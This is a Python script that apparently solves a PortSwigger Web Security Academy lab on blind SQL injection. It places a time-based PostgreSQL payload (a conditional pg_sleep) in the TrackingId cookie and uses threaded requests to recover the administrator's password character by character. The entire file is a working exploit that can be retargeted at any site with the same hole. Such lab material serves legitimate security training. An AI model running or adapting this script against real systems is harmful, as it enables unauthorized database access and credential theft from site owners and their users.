import requests
import string
import time
import threading
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

arr = string.ascii_lowercase + string.digits

URL = 'https://0a52008804264768c3263649004e0093.web-security-academy.net/login'

session = requests.Session()
response = session.get(URL)
soup = BeautifulSoup(response.text, 'html.parser')
form = soup.find('form')
csrf_input = form.find('input', {'name': 'csrf'})

if csrf_input is None:
    print("[-] CSRF token not found in login page")
    exit(1)

csrf_value = csrf_input.get('value')
print(f"[+] Found CSRF token: {csrf_value}")

password = ['']
lock = threading.Lock()


def test_character(char, position):
    payload = f"pJKIYzIJxz2YxehT' || (SELECT CASE WHEN (substring((select password from users where username='administrator'),{position},1) = '{char}') THEN pg_sleep(3) ELSE pg_sleep(0) END)--"
    cookies = {'TrackingId': payload}
    data = {
        'csrf': csrf_value,
        'username': 'a',
        'password': 'password'
    }
    start = time.perf_counter()
    response = session.post(URL, data=data, cookies=cookies)
    request_time = time.perf_counter() - start

    if request_time > 3:
        with lock:
            password[0] += char
        print(f"[+] Found character: {char} at position {position}")
        return True
    return False


def find_next_character(position):
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(test_character, char, position): char for char in arr}
        for future in futures:
            if future.result():
                return


count = 1

while len(password[0]) < 20:
    find_next_character(count)
    count += 1

print(f"[+] Password found: {password[0]}")
